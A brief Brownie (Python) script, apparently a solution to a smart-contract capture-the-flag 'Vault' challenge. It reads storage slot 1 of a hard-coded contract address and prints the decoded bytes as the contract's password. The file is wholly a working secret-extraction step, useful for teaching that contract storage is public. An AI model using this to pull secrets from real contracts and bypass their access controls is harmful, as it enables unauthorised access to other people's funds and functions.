from brownie import accounts, ForceTransfer, chain, web3, Contract
import brownie
import pytest


def main():
    vault_addr = "0xeC4b5Bc35DDB59A286D44Ac2f7c509B2c04C1a7e"
    password = web3.toText(hexstr=web3.eth.getStorageAt(vault_addr, 1).hex())
    print(password)
